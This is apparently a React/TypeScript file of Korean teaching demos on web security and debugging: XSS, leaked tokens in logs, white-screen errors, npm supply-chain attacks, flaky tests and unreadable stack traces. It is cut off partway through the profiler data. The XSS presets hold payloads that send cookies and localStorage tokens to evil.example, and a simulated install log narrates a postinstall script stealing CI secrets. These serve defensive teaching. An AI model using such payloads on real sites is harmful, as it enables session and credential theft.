/* 10 보안 · 디버깅 — 데모 모음. fixed=false 문제 그대로, true 해결 적용
 * 안전 원칙: 입력한 코드는 절대 이 페이지에서 실행하지 않아요. 네트워크 요청 없음, 전역 객체는 잠깐도 바꾸지 않아요. */
import { Component, useEffect, useMemo, useRef, useState, type ComponentType, type ErrorInfo, type ReactNode } from 'react'
import { Seg, useTimers } from '../../components/ui'
import { Meter } from '../ui'

const fmt = (n: number) => n.toLocaleString('ko-KR')

/** 데모가 사라지면 더 이상 setState 하지 않게 */
function useAlive() {
  const alive = useRef(true)
  useEffect(() => { alive.current = true; return () => { alive.current = false } }, [])
  return alive
}

/** 데모 전용 에러 바운더리 — 데모 안의 에러가 바깥(진짜 페이지)으로 새지 않게 막아요 */
class Boundary extends Component<
  { fallback: (error: Error, info: ErrorInfo | null, reset: () => void) => ReactNode; onError?: (e: Error, info: ErrorInfo) => void; children: ReactNode },
  { error: Error | null; info: ErrorInfo | null }
> {
  state: { error: Error | null; info: ErrorInfo | null } = { error: null, info: null }
  static getDerivedStateFromError(error: Error) { return { error } }
  componentDidCatch(error: Error, info: ErrorInfo) { this.setState({ info }); this.props.onError?.(error, info) }
  reset = () => this.setState({ error: null, info: null })
  render() { return this.state.error ? this.props.fallback(this.state.error, this.state.info, this.reset) : this.props.children }
}

/* ---------- 01 XSS ---------- */
const XSS_PRESETS: [string, string][] = [
  ['이미지 onerror', '오늘 공구 후기 남겨요! 배송 빨라요 👍\n<img src=x onerror="fetch(\'https://evil.example/c?=\'+document.cookie)">'],
  ['javascript: 링크', '<b>할인 코드</b> 받으러 가기 → <a href="javascript:location=\'https://evil.example/?t=\'+localStorage.token">여기</a>'],
  ['마우스 올리기', '<div onmouseover="new Image().src=\'https://evil.example/?k=\'+document.cookie">사진 크게 보기</div>\n<script>steal()</script>'],
]
type Hit = { tag: string; where: string; when: string; what: string; runs: boolean; steals: boolean }
const URL_ATTRS = ['src', 'href', 'srcset', 'action', 'formaction', 'poster', 'data', 'background', 'xlink:href']
const DROP_TAGS = ['meta', 'base', 'link', 'iframe', 'frame', 'object', 'embed', 'form']

function intent(code: string) {
  const c = code.toLowerCase()
  const steals = /cookie|localstorage|sessionstorage/.test(c)
  const what = c.includes('cookie') ? '쿠키를 훔쳐 보내려고 해요'
    : /localstorage|sessionstorage/.test(c) ? '저장소의 토큰을 꺼내 보내려고 해요'
      : /fetch|xmlhttprequest|sendbeacon|new image/.test(c) ? '외부 서버로 무언가 보내려고 해요'
        : c.includes('location') ? '다른 사이트로 보내려고 해요'
          : c.includes('alert') ? '경고창을 띄워요 (공격이 되는지 떠보는 코드)'
            : '아무 코드나 실행할 수 있어요'
  return { what, steals }
}
const WHEN: Record<string, string> = {
  onerror: '이미지를 못 불러오면 바로', onload: '불러오자마자', onmouseover: '마우스를 올리면', onclick: '누르면',
  onfocus: '포커스되면', onanimationstart: '애니메이션이 시작되면', onpointerenter: '포인터가 들어오면',
}
/** 입력을 '분석만' 해요. DOMParser 문서는 스크립트를 돌리지 않고 이미지도 받지 않아요 */
function analyze(html: string) {
  const doc = new DOMParser().parseFromString(html, 'text/html')
  const hits: Hit[] = []
  doc.body.querySelectorAll('*').forEach(el => {
    const tag = el.tagName.toLowerCase()
    if (tag === 'script') {
      hits.push({ tag: '<script>', where: (el.textContent || '').slice(0, 40), when: 'innerHTML로 넣은 <script>는', what: '실행되지 않아요 — 그래서 공격자는 위처럼 이벤트 속성을 써요', runs: false, steals: false })
      return
    }
    for (const a of Array.from(el.attributes)) {
      const n = a.name.toLowerCase()
      if (n.startsWith('on')) {
        const it = intent(a.value)
        hits.push({ tag: `<${tag} ${n}>`, where: a.value, when: (WHEN[n] ?? `${n.slice(2)} 이벤트가 생기면`), ...it, runs: true })
      } else if (URL_ATTRS.includes(n) && /^\s*javascript:/i.test(a.value)) {
        const it = intent(a.value)
        hits.push({ tag: `<${tag} ${n}="javascript:…">`, where: a.value, when: '링크를 누르면', ...it, runs: true })
      }
    }
  })
  return { doc, hits }
}
/** 문제 그대로 미리보기 — sandbox="" (스크립트 금지) 안에서만 그려요. 주소는 모두 지워서 요청도 안 나가요 */
function inertSrcdoc(doc: Document) {
  const body = doc.body.cloneNode(true) as HTMLElement
  body.querySelectorAll(DROP_TAGS.join(',')).forEach(el => el.remove())
  body.querySelectorAll('*').forEach(el => {
    for (const n of URL_ATTRS) if (el.hasAttribute(n)) el.setAttribute(n, n === 'src' ? 'data:,' : '')
  })
  const csp = `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src data:; style-src 'unsafe-inline'">`
  const css = '<style>body{margin:0;font:14px/1.6 system-ui,sans-serif;color:#222;white-space:pre-wrap;word-break:break-all}a{pointer-events:none;color:#3355dd}img{width:18px;height:18px;vertical-align:middle}</style>'
  return `<!doctype html><html><head>${csp}${css}</head><body>${body.innerHTML}</body></html>`
}
/** 손으로 쓴 허용 목록 정리기 (데모용) — DOM을 React 요소로 다시 만들어요. innerHTML 은 쓰지 않아요 */
const ALLOW = new Set(['b', 'strong', 'i', 'em', 'u', 'br', 'p', 'a', 'ul', 'ol', 'li', 'code'])
function sanitizeToReact(html: string) {
  const doc = new DOMParser().parseFromString(html, 'text/html')
  let removed = 0, kept = 0
  const walk = (n: Node, key: string): ReactNode => {
    if (n.nodeType === Node.TEXT_NODE) return n.textContent
    if (n.nodeType !== Node.ELEMENT_NODE) return null
    const el = n as Element
    const tag = el.tagName.toLowerCase()
    const kids = () => Array.from(el.childNodes).map((c, i) => walk(c, key + '.' + i))
    removed += Array.from(el.attributes).filter(a => !(tag === 'a' && a.name === 'href')).length
    if (['script', 'style', 'template', 'svg', 'math', 'iframe', 'object'].includes(tag)) { removed++; return null }
    if (!ALLOW.has(tag)) { removed++; return <span key={key}>{kids()}</span> } // 태그만 벗기고 글자는 남겨요
    kept++
    if (tag === 'br') return <br key={key} />
    if (tag === 'a') {
      const href = el.getAttribute('href') ?? ''
      const safe = /^https?:\/\//i.test(href)
      if (!safe && href) removed++
      return <a key={key} href={safe ? href : undefined} rel="noopener noreferrer nofollow" onClick={e => e.preventDefault()}>{kids()}</a>
    }
    const Tag = tag as 'b'
    return <Tag key={key}>{kids()}</Tag>
  }
  const out = Array.from(doc.body.childNodes).map((c, i) => walk(c, String(i)))
  return { out, removed, kept }
}

export function XssDemo({ fixed }: { fixed: boolean }) {
  const [text, setText] = useState(XSS_PRESETS[0][1])
  const [how, setHow] = useState<'text' | 'allow'>('text')
  const { doc, hits } = useMemo(() => analyze(text), [text])
  const srcdoc = useMemo(() => inertSrcdoc(doc), [doc])
  const clean = useMemo(() => sanitizeToReact(text), [text])
  const runs = hits.filter(h => h.runs)
  const steals = runs.filter(h => h.steals).length
  return (
    <div className="dg-col">
      <div className="dv-row">
        {XSS_PRESETS.map(([l, v]) => <button key={l} type="button" className={'btn sm ghost' + (text === v ? ' dg-on' : '')} onClick={() => setText(v)}>{l}</button>)}
      </div>
      <textarea className="dg-input dg-ta" value={text} onChange={e => setText(e.target.value)} aria-label="게시글 내용" rows={3} spellCheck={false} />
      {fixed && <Seg value={how} onChange={setHow} className="dg-seg" options={[['text', '글자 그대로 (React)'], ['allow', '허용 목록 정리']]} />}
      <div className="dg-post">
        <div className="dg-post-head"><span className="dg-av" />익명의 구매자 · 방금</div>
        {!fixed && <iframe className="dg-frame" sandbox="" srcDoc={srcdoc} title="게시글 미리보기 (스크립트 금지 샌드박스)" />}
        {fixed && how === 'text' && <p className="dg-post-body dg-pre">{text}</p>}
        {fixed && how === 'allow' && <p className="dg-post-body dg-pre">{clean.out}</p>}
      </div>
      <div className="dv-meters">
        <Meter label="실행됐을 코드" value={fixed ? '0개' : `${runs.length}개`} bad={!fixed && runs.length > 0} />
        <Meter label="쿠키 · 토큰 탈취 시도" value={fixed ? '0개' : `${steals}개`} bad={!fixed && steals > 0} />
        {fixed && <Meter label={how === 'text' ? '태그로 해석된 것' : '지운 태그 · 속성'} value={how === 'text' ? '0개 (글자로만)' : `${clean.removed}개`} bad={false} />}
      </div>
      {!fixed && (
        <ul className="dg-hits">
          {hits.length === 0 && <li className="dg-hit-none">실행될 만한 코드가 없어요. 위 예시를 눌러 보세요.</li>}
          {hits.map((h, i) => (
            <li key={i} className={h.runs ? 'run' : 'skip'}>
              <b>{h.runs ? '이 코드가 실행됐을 거예요' : '참고'}</b>
              <code>{h.tag}</code>
              <span>{h.when} → {h.what}</span>
            </li>
          ))}
        </ul>
      )}
      {fixed && <p className="dv-log">{how === 'text' ? <>React의 <code>{'{text}'}</code>는 <b>&lt; &gt;를 글자로 바꿔서</b> 넣어요. 태그가 하나도 해석되지 않아요.</> : <>굵게·기울임·http 링크만 남기고 <b>나머지 태그와 모든 속성을 지워요</b>. 실무에선 DOMPurify를 써요.</>}</p>}
    </div>
  )
}

/* ---------- 02 운영 콘솔 토큰 ---------- */
type Lv = 'debug' | 'info' | 'warn' | 'error'
type Line = { lv: Lv; text: string }
type Logger = Record<Lv, (msg: string, data?: unknown) => void>
const TOKEN = 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI0MiJ9.k3YqZ0dummy'
const REFRESH = 'rt_9f8a2c71dummy'
const PII = ['haneul.kim@example.com', 'pa55word!', '010-2345-6789', TOKEN, REFRESH]
const SECRET_KEY = /token|password|authorization|secret|cookie/i
function redact(v: unknown, k = ''): unknown {
  if (SECRET_KEY.test(k)) return '[가림]'
  if (typeof v === 'string') {
    if (/@/.test(v)) return v.replace(/^(.).*(@.*)$/, '$1***$2')
    if (/^01\d-\d{3,4}-\d{4}$/.test(v)) return v.replace(/-\d{3,4}-/, '-****-')
    return v
  }
  if (v && typeof v === 'object') return Object.fromEntries(Object.entries(v).map(([kk, vv]) => [kk, redact(vv, kk)]))
  return v
}
const show = (d: unknown) => d === undefined ? '' : ' ' + JSON.stringify(d)
/** ✕ 받은 걸 그대로 찍는 로거 (console.log 를 아무 데나 쓴 것과 같아요) */
const rawLogger = (push: (l: Line) => void): Logger => ({
  debug: (m, d) => push({ lv: 'debug', text: m + show(d) }), info: (m, d) => push({ lv: 'info', text: m + show(d) }),
  warn: (m, d) => push({ lv: 'warn', text: m + show(d) }), error: (m, d) => push({ lv: 'error', text: m + show(d) }),
})
/** ✓ 운영에선 debug·info 를 버리고, 남는 줄도 민감한 값을 가려요 */
const safeLogger = (push: (l: Line) => void, prod: boolean, dropped: () => void): Logger => {
  const out = (lv: Lv) => (m: string, d?: unknown) => {
    if (prod && (lv === 'debug' || lv === 'info')) { dropped(); return }
    push({ lv, text: m + show(redact(d)) })
  }
  return { debug: out('debug'), info: out('info'), warn: out('warn'), error: out('error') }
}
/** 가짜 로그인 흐름 — 앱 코드는 로거만 받아요 */
async function fakeLogin(log: Logger, wait: (ms: number) => Promise<void>) {
  log.debug('로그인 요청', { email: 'haneul.kim@example.com', password: 'pa55word!' })
  await wait(450)
  log.debug('응답', { accessToken: TOKEN, user: { name: '김하늘', phone: '010-2345-6789' } })
  await wait(250)
  log.warn('토큰 만료 임박', { expiresIn: 60, refreshToken: REFRESH })
  log.info('로그인 완료')
}
export function ConsoleDemo({ fixed }: { fixed: boolean }) {
  const [lines, setLines] = useState<Line[]>([])
  const [prod, setProd] = useState(true)
  const [drop, setDrop] = useState(0)
  const [state, setState] = useState<'idle' | 'busy' | 'done'>('idle')
  const timers = useTimers()
  const alive = useAlive()
  const run = async () => {
    setLines([]); setDrop(0); setState('busy')
    const push = (l: Line) => { if (alive.current) setLines(ls => [...ls, l]) }
    const log = fixed ? safeLogger(push, prod, () => alive.current && setDrop(n => n + 1)) : rawLogger(push)
    await fakeLogin(log, ms => new Promise(r => timers.set(r, ms)))
    if (alive.current) setState('done')
  }
  const all = lines.map(l => l.text).join('\n')
  const tokens = [TOKEN, REFRESH].filter(t => all.includes(t)).length
  const pii = PII.slice(0, 3).filter(t => all.includes(t)).length
  return (
    <div className="dg-col">
      <div className="dg-login">
        <div className="dg-login-form">
          <span className="dg-field">haneul.kim@example.com</span>
          <span className="dg-field">••••••••</span>
          <button type="button" className="btn sm" onClick={run} disabled={state === 'busy'}>{state === 'busy' ? '로그인 중…' : state === 'done' ? '다시 로그인' : '로그인'}</button>
        </div>
        {state === 'done' && <p className="dg-login-ok">김하늘 님, 반가워요</p>}
      </div>
      {fixed && <Seg value={prod ? 1 : 0} onChange={v => { setProd(v === 1); setLines([]); setState('idle') }} className="dg-seg" options={[[0, '개발 빌드'], [1, '운영 빌드']]} />}
      <div className="dg-console" aria-label="데모 콘솔" aria-live="polite">
        <div className="dg-console-bar"><span>Console</span><small>{fixed ? (prod ? '운영' : '개발') : '운영'}</small></div>
        {lines.length === 0 && <p className="dg-console-empty">{state === 'busy' ? '…' : '로그인을 눌러 보세요'}</p>}
        {lines.map((l, i) => <div key={i} className={'dg-cl ' + l.lv}><i>{l.lv}</i><span>{l.text}</span></div>)}
        {fixed && drop > 0 && <div className="dg-cl dropped"><i>—</i><span>debug · info {drop}줄은 운영 빌드에서 버렸어요</span></div>}
      </div>
      <div className="dv-meters">
        <Meter label="콘솔에 보인 토큰" value={`${tokens}개`} bad={tokens > 0} />
        <Meter label="보인 개인정보" value={`${pii}개`} bad={pii > 0} />
        <Meter label="출력된 줄" value={`${lines.length}줄`} />
      </div>
    </div>
  )
}

/* ---------- 03 하얀 화면 ---------- */
class DemoAsyncError extends Error { name = 'DemoAsyncError' }
type Reco = { items: string[] | null }
function Recommend({ data }: { data: Reco }) {
  // ✕ 서버가 items: null 을 보내면 여기서 TypeError 가 나요 (진짜로 던져져요)
  return <ul className="dg-reco">{data.items!.map(x => <li key={x}>{x}</li>)}</ul>
}
const GOOD_RECO: Reco = { items: ['가을 니트', '울 머플러', '부츠'] }
function MiniApp({ fixed, reco, onBroke, onCoupon }: { fixed: boolean; reco: Reco; onBroke: (b: boolean) => void; onCoupon: () => void }) {
  const widget = <section className="dg-w"><h6>추천 상품</h6><Recommend data={reco} /></section>
  return (
    <div className="dg-app">
      <header className="dg-app-head"><b>마켓 하루</b><span>장바구니 2</span></header>
      <div className="dg-app-body">
        <section className="dg-w"><h6>주문 요약</h6><p>배송 중 1건 · 결제 대기 0건</p><button type="button" className="btn sm ghost" onClick={onCoupon}>쿠폰 받기</button></section>
        {fixed
          ? <Boundary onError={() => onBroke(true)} fallback={(_e, _i, reset) => (
            <section className="dg-w dg-w-fallback"><h6>추천 상품</h6><p>추천을 불러오지 못했어요.</p>
              <button type="button" className="btn sm" onClick={() => { onBroke(false); reset() }}>다시 시도</button></section>
          )}>{widget}</Boundary>
          : widget}
        <section className="dg-w"><h6>공지</h6><p>11월 정기 점검은 새벽 2시예요.</p></section>
      </div>
    </div>
  )
}
export function WhiteDemo({ fixed }: { fixed: boolean }) {
  const [reco, setReco] = useState<Reco>(GOOD_RECO)
  const [broke, setBroke] = useState(false)
  const [white, setWhite] = useState(false)
  const [shell, setShell] = useState(0)
  const [toast, setToast] = useState('')
  const [asyncSeen, setAsyncSeen] = useState<'—' | 'console' | 'toast'>('—')
  const timers = useTimers()
  const alive = useAlive()

  // ✓ 비동기 에러는 바운더리가 못 잡아요 → 전역 안전망. 이 데모가 던진 에러만 받고, 사라질 때 떼요
  useEffect(() => {
    if (!fixed) return
    const on = (e: PromiseRejectionEvent) => {
      if (!(e.reason instanceof DemoAsyncError)) return
      e.preventDefault()
      if (!alive.current) return
      setToast('쿠폰을 받지 못했어요. 잠시 뒤 다시 눌러 주세요.'); setAsyncSeen('toast')
      timers.set(() => alive.current && setToast(''), 2600)
    }
    window.addEventListener('unhandledrejection', on)
    return () => window.removeEventListener('unhandledrejection', on)
  }, [fixed, alive, timers])

  const coupon = () => {
    const claim = async () => { await new Promise<void>(r => timers.set(r, 250)); throw new DemoAsyncError('쿠폰 서버가 500을 돌려줬어요') }
    void claim() // ✕ catch 없음 — 이벤트 핸들러·비동기 에러는 에러 바운더리가 못 잡아요
    if (!fixed) timers.set(() => alive.current && setAsyncSeen('console'), 300)
  }
  const restart = () => { timers.clear(); setReco(GOOD_RECO); setBroke(false); setWhite(false); setToast(''); setAsyncSeen('—'); setShell(s => s + 1) }
  const alive3 = white ? 0 : broke ? 2 : 3
  return (
    <div className="dg-col">
      <div className="dv-row">
        <button type="button" className="btn sm danger" onClick={() => setReco({ items: null })} disabled={reco.items === null}>추천 API가 null 보내기</button>
        <button type="button" className="btn sm ghost" onClick={restart}>처음으로</button>
      </div>
      <div className="dg-shell">
        {/* 데모 껍데기 바운더리 — '고치기 전'에서 하얀 화면을 보여주되 진짜 페이지는 지켜요 */}
        <Boundary key={shell} onError={() => setWhite(true)} fallback={() => <div className="dg-white" aria-label="하얀 화면"><small>(이 데모 칸만 하얘진 거예요)</small></div>}>
          <MiniApp fixed={fixed} reco={reco} onBroke={b => { setBroke(b); if (!b) setReco(GOOD_RECO) }} onCoupon={coupon} />
        </Boundary>
        {toast && <div className="dg-toast" role="status">{toast}</div>}
      </div>
      <div className="dv-meters">
        <Meter label="살아 있는 영역" value={`${alive3} / 3`} bad={alive3 === 0} />
        <Meter label="사용자가 할 수 있는 일" value={white ? '새로고침뿐' : broke ? '다시 시도' : '전부'} bad={white} />
        <Meter label="쿠폰 에러 알림" value={asyncSeen === '—' ? '—' : asyncSeen === 'console' ? '콘솔에만' : '토스트로 안내'} bad={asyncSeen === '—' ? undefined : asyncSeen === 'console'} />
      </div>
    </div>
  )
}

/* ---------- 04 npm 공급망 ---------- */
type Step = { t: string; tone?: 'bad' | 'good' | 'dim' | 'warn' }
const SUPPLY_BAD: Step[] = [
  { t: '$ npm install', tone: 'dim' },
  { t: 'left-padder  ^1.4.2 → 1.4.3 받음 (2시간 전 배포, 관리자 계정 바뀜)', tone: 'warn' },
  { t: 'reacct-dom@19.0.0 받음 (복붙한 설치 명령의 오타)', tone: 'warn' },
  { t: '> left-padder@1.4.3 postinstall: node setup.js', tone: 'bad' },
  { t: '  환경 변수 읽음: NPM_TOKEN, GITHUB_TOKEN, AWS_SECRET…', tone: 'bad' },
  { t: '  node_modules/vite 플러그인 파일 수정', tone: 'bad' },
  { t: '$ npm run build', tone: 'dim' },
  { t: 'dist/assets/index.js 에 결제 폼 가로채는 코드 섞임', tone: 'bad' },
]
const SUPPLY_GOOD: Step[] = [
  { t: '$ npm ci --ignore-scripts', tone: 'dim' },
  { t: 'package-lock.json 그대로: left-padder 1.4.2 (integrity sha512 일치)', tone: 'good' },
  { t: 'reacct-dom: 리뷰에서 막힘 — react-dom과 한 글자 차이, 주간 다운로드 12회', tone: 'good' },
  { t: '설치 스크립트 실행 안 함 (ignore-scripts)', tone: 'good' },
  { t: '$ npm audit signatures', tone: 'dim' },
  { t: '서명·출처(provenance) 확인 완료', tone: 'good' },
  { t: 'Renovate: left-padder 1.4.3 PR은 배포 3일 뒤에 열려요 (최소 공개 기간)', tone: 'good' },
  { t: '$ npm run build → 결과물 해시가 지난 빌드와 같아요', tone: 'good' },
]
export function SupplyDemo({ fixed }: { fixed: boolean }) {
  const steps = fixed ? SUPPLY_GOOD : SUPPLY_BAD
  const [n, setN] = useState(0)
  const timers = useTimers()
  const play = () => { timers.clear(); setN(0); steps.forEach((_, i) => timers.set(() => setN(i + 1), 380 * (i + 1))) }
  const done = n === steps.length
  return (
    <div className="dg-col">
      <div className="dg-term" aria-live="polite">
        {steps.slice(0, n).map((s, i) => <div key={i} className={'dg-tl ' + (s.tone ?? '')}>{s.t}</div>)}
        {n === 0 && <div className="dg-tl dim">CI 서버에서 설치·빌드를 돌려 볼게요</div>}
        {n > 0 && !done && <div className="dg-tl dim dg-caret">▍</div>}
      </div>
      <div className="dv-row"><button type="button" className="btn sm" onClick={play}>CI 돌리기</button><span className="dv-log">실제 설치 없이 흐름만 보여 주는 시뮬레이션이에요</span></div>
      <div className="dv-meters">
        <Meter label="실행된 설치 스크립트" value={done ? (fixed ? '0개' : '1개') : '—'} bad={done ? !fixed : undefined} />
        <Meter label="잠금 파일과 다른 버전" value={done ? (fixed ? '0개' : '1개') : '—'} bad={done ? !fixed : undefined} />
        <Meter label="의심 패키지" value={done ? (fixed ? '1개 막음' : '2개 설치') : '—'} bad={done ? !fixed : undefined} />
      </div>
    </div>
  )
}

/* ---------- 05 Storybook 어긋남 ---------- */
type BtnV1 = { label: string; variant: 'primary' | 'ghost' }
function ButtonV1({ label, variant }: BtnV1) { return <span className={'dg-sbtn ' + variant}>{label}</span> }
/** v2: label → children, variant → tone 으로 바뀌었어요. 모르는 prop 은 조용히 무시돼요 */
function ButtonV2({ children, tone }: { children?: ReactNode; tone?: 'brand' | 'plain' }) { return <span className={'dg-sbtn v2 ' + (tone ?? 'plain')}>{children ?? ''}</span> }
export function StorybookDemo({ fixed }: { fixed: boolean }) {
  const [v2, setV2] = useState(false)
  const [phase, setPhase] = useState<'none' | 'ci' | 'ok'>('none')
  const timers = useTimers()
  const ship = () => { setV2(true); if (fixed) { setPhase('ci'); timers.set(() => setPhase('ok'), 1200) } }
  // 문제 그대로: 스토리가 컴포넌트 복사본(ButtonV1)과 옛 args를 써요. 실제 화면은 v2에 옛 props를 넘겨요
  const oldArgs = { label: '구매하기', variant: 'primary' } as Record<string, string>
  const real = v2 ? <ButtonV2 {...oldArgs} /> : <ButtonV1 label="구매하기" variant="primary" />
  const story = fixed
    ? (v2 ? (phase === 'ok' ? <ButtonV2 tone="brand">구매하기</ButtonV2> : <ButtonV1 label="구매하기" variant="primary" />) : <ButtonV1 label="구매하기" variant="primary" />)
    : <ButtonV1 label="구매하기" variant="primary" />
  const realFixed = fixed && v2 ? (phase === 'ok' ? <ButtonV2 tone="brand">구매하기</ButtonV2> : <ButtonV1 label="구매하기" variant="primary" />) : real
  const diff = !fixed && v2 ? 2 : 0
  return (
    <div className="dg-col">
      <div className="dg-sb">
        <div className="dg-sb-pane"><small>Storybook · Button/Primary</small><div className="dg-sb-view">{story}</div></div>
        <div className="dg-sb-pane"><small>실제 상품 화면</small><div className="dg-sb-view">{fixed ? realFixed : real}</div></div>
      </div>
      <div className="dv-row">
        <button type="button" className="btn sm" onClick={ship} disabled={v2}>Button v2 배포 (prop 이름 변경)</button>
        <button type="button" className="btn sm ghost" onClick={() => { timers.clear(); setV2(false); setPhase('none') }}>되돌리기</button>
      </div>
      {fixed && phase !== 'none' && (
        <div className="dg-term small">
          <div className="dg-tl dim">CI · tsc --noEmit · test-storybook · 시각 회귀</div>
          <div className="dg-tl bad">Button.stories.tsx: &apos;variant&apos;은 ButtonProps에 없어요 (args satisfies)</div>
          <div className="dg-tl warn">시각 회귀: Button/Primary 픽셀 차이 → 리뷰 대기</div>
          {phase === 'ok' && <div className="dg-tl good">스토리 args 고침 → 승인 → 배포</div>}
        </div>
      )}
      <div className="dv-meters">
        <Meter label="스토리와 실제가 다른 곳" value={`${diff}곳`} bad={diff > 0} />
        <Meter label="배포 전에 잡은 문제" value={v2 ? (fixed ? '2개' : '0개') : '—'} bad={v2 ? !fixed : undefined} />
      </div>
      {!fixed && v2 && <p className="dv-log">스토리는 컴포넌트 <b>복사본</b>을 그려서 멀쩡해요. 실제 화면은 모르는 prop을 조용히 무시해서 글자도 색도 빠졌어요.</p>}
    </div>
  )
}

/* ---------- 06 간헐적 E2E ---------- */
type Run = { pass: boolean; ms: number; delay: number }
export function FlakyDemo({ fixed }: { fixed: boolean }) {
  const [how, setHow] = useState<'wait' | 'mock'>('wait')
  const [runs, setRuns] = useState<(Run | null)[]>([])
  const [busy, setBusy] = useState(false)
  const timers = useTimers()
  const alive = useAlive()
  const sleep = (ms: number) => new Promise<void>(r => timers.set(r, ms))
  /** 테스트 한 번 — 진짜 타이머와 진짜 무작위 지연으로 돌아요 */
  const once = async (): Promise<Run> => {
    const mode = fixed ? how : 'sleep'
    const delay = mode === 'mock' ? 40 : 300 + Math.random() * 600 // 서버 응답 300~900ms
    const app = { visible: false }
    const t0 = performance.now()
    timers.set(() => { app.visible = true }, delay)
    if (mode === 'sleep') {
      await sleep(500) // ✕ 고정 대기
      return { pass: app.visible, ms: performance.now() - t0, delay }
    }
    while (!app.visible && performance.now() - t0 < 5000) await sleep(30) // ✓ 조건을 기다려요 (최대 5초)
    return { pass: app.visible, ms: performance.now() - t0, delay }
  }
  const go = async () => {
    setBusy(true); setRuns(Array(20).fill(null))
    await Promise.all(Array.from({ length: 20 }, async (_, i) => {
      const r = await once()
      if (alive.current) setRuns(rs => rs.map((x, j) => j === i ? r : x))
    }))
    if (alive.current) setBusy(false)
  }
  const doneRuns = runs.filter((r): r is Run => !!r)
  const pass = doneRuns.filter(r => r.pass).length
  const avg = doneRuns.length ? doneRuns.reduce((s, r) => s + r.ms, 0) / doneRuns.length : 0
  const finished = runs.length > 0 && doneRuns.length === 20
  return (
    <div className="dg-col">
      {fixed && <Seg value={how} onChange={v => { setHow(v); setRuns([]) }} className="dg-seg" options={[['wait', '조건 기다리기'], ['mock', '네트워크 고정 (mock)']]} />}
      <div className="dg-testcode"><code>{!fixed ? 'await sleep(500); expect(목록).보임' : how === 'wait' ? 'await expect(목록).toBeVisible()  // 최대 5초' : "page.route('**/api/orders', 고정 응답)"}</code></div>
      <div className="dg-dots" aria-label="20번 실행 결과">
        {Array.from({ length: 20 }, (_, i) => {
          const r = runs[i]
          return <span key={i} className={'dg-dotr' + (r ? (r.pass ? ' pass' : ' fail') : runs.length ? ' wait' : '')} title={r ? `응답 ${Math.round(r.delay)}ms · ${r.pass ? '통과' : '실패'}` : ''}>{r ? (r.pass ? '✓' : '✕') : ''}</span>
        })}
      </div>
      <div className="dv-row"><button type="button" className="btn sm" onClick={go} disabled={busy}>{busy ? '도는 중…' : '테스트 20번 돌리기'}</button></div>
      <div className="dv-meters">
        <Meter label="통과" value={finished ? `${pass} / 20` : '—'} bad={finished ? pass < 20 : undefined} />
        <Meter label="평균 걸린 시간" value={finished ? `${fmt(Math.round(avg))}ms` : '—'} />
        <Meter label="응답 범위" value={!fixed || how === 'wait' ? '300~900ms' : '40ms 고정'} />
      </div>
    </div>
  )
}

/* ---------- 07 추적 불가능한 스택 ---------- */
type PriceProps = { price?: { amount: number } }
// ✕ 모든 HOC가 같은 이름(Wrapper)을 돌려주고, 안쪽 컴포넌트는 이름 없는 화살표 함수예요
const wrapAll = <P extends object>(C: ComponentType<P>) => function Wrapper(p: P) { return <C {...p} /> }
const anon = (): ComponentType<PriceProps> => p => <b>{p.price!.amount.toLocaleString()}원</b>
const BadTag = wrapAll(wrapAll(wrapAll(wrapAll(anon()))))
// ✓ 이름 있는 컴포넌트 + displayName
function PriceTag({ price }: PriceProps) { return <b>{price!.amount.toLocaleString()}원</b> }
const dn = (C: ComponentType<never>) => C.displayName || C.name || 'Component'
function hoc(label: string) {
  return <P extends object>(C: ComponentType<P>) => {
    function Hoc(p: P) { return <C {...p} /> }
    Hoc.displayName = `${label}(${dn(C as ComponentType<never>)})`
    return Hoc
  }
}
const GoodTag = hoc('withAuth')(hoc('withTheme')(hoc('withTracking')(hoc('withLogger')(PriceTag))))

const short = (line: string) => line.trim()
  .replace(/https?:\/\/[^\s)]*\/([^/\s?)]+)(\?[^\s:)]*)?:(\d+):(\d+)/g, '$1:$3')
  .replace(/\s+\(<anonymous>\)/, '')
function StackView({ error, info, fixed }: { error: Error; info: ErrorInfo | null; fixed: boolean }) {
  const comp = (info?.componentStack ?? '').split('\n').map(short).filter(Boolean)
  const mine = comp.slice(0, 6)
  const named = mine.filter(l => /at (with\w+\(|PriceTag)/.test(l)).length
  const found = mine.some(l => l.includes('PriceTag'))
  const js = (error.stack ?? '').split('\n').slice(1).map(short).filter(Boolean)
  const ours = js.filter(l => l.includes('debug-demos')).slice(0, 2)
  const lib = js.length - ours.length
  return (
    <>
      <div className="dg-stack">
        <div className="dg-tl bad">{error.name}: {error.message}</div>
        <div className="dg-tl dim">— info.componentStack (위 6줄) —</div>
        {mine.map((l, i) => <div key={i} className={'dg-tl' + (/PriceTag|with\w+\(/.test(l) ? ' good' : '')}>{l}</div>)}
        <div className="dg-tl dim">— error.stack —</div>
        {ours.map((l, i) => <div key={i} className="dg-tl">{l}</div>)}
        <div className="dg-tl dim">… 라이브러리 내부 {lib}줄</div>
      </div>
      <div className="dv-meters">
        <Meter label="뜻이 보이는 컴포넌트 줄" value={`${named} / ${mine.length}`} bad={!fixed} />
        <Meter label="원인 컴포넌트" value={found ? 'PriceTag' : '못 찾음'} bad={!found} />
      </div>
    </>
  )
}
export function StackDemo({ fixed }: { fixed: boolean }) {
  const [go, setGo] = useState(0)
  const Tag = fixed ? GoodTag : BadTag
  return (
    <div className="dg-col">
      <div className="dv-row">
        <button type="button" className="btn sm danger" onClick={() => setGo(g => g + 1)}>가격 없이 가격표 그리기</button>
        <span className="dv-log">HOC 4겹 안에서 진짜 TypeError가 나요</span>
      </div>
      {go === 0
        ? <p className="dv-log dg-stack-empty">버튼을 누르면 에러 바운더리가 받은 스택을 그대로 보여 줘요.</p>
        : <Boundary key={go} fallback={(e, info) => <StackView error={e} info={info} fixed={fixed} />}><Tag /></Boundary>}
    </div>
  )
}

/* ---------- 08 미니파이 프로파일 ---------- */
type Fn = { min: string; minAt: string; name: string; at: string; ms: number; depth: number; x: number }
const PROFILE: Fn[] = [
  { min: 'Ve', minAt: 'index-B3x9kq.js:1:8812', name: 'OrderTable', at: 'OrderTable.tsx:41', ms: 640, depth: 0, x: 0 },
  { min: 'a', minAt: 'index-B3x9kq.js:1:48213', name: 'formatOrderRows', at: 'OrderTable.tsx:88', ms: 470, depth: 1, x: 0 },
  { min: 't', minAt: 'index-B3x9kq.js:1:48390', name: 'formatPrice', at: 'money.ts:12', ms: 412, depth: 2, x: 0 },
